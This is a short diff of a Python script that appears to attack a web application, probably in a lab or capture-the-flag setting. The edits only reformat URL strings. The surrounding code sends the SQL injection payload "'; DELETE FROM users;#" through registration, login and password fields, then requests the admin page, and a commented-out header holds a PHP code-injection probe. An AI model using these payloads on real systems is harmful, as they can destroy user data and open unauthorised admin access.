@@ -12,7 +12,7 @@ cookies = {
 }
 
 # headers = {
-	
+
 # 	"User-Agent": "<?php phpinfo(); ?>"
 # }
 
@@ -56,22 +56,22 @@ data = {
 	"confirm_password": "'; DELETE FROM users;#",
 }
 
-r = s.post(url + "register/", data = data)
+r = s.post(f"{url}register/", data = data)
 
-r = s.post(url + "login/index.php", data = data)
+r = s.post(f"{url}login/index.php", data = data)
 
 data = {
-	
+
 	"password": "'; DELETE FROM users;#",
 	"new_password": "anything",
 }
 
-r = s.get(url + "admin/")
+r = s.get(f"{url}admin/")
 # print(r.text)
 
 # print(r.text)
 
 # r = requests.get(url)
-	
+
 
 print(r.text)
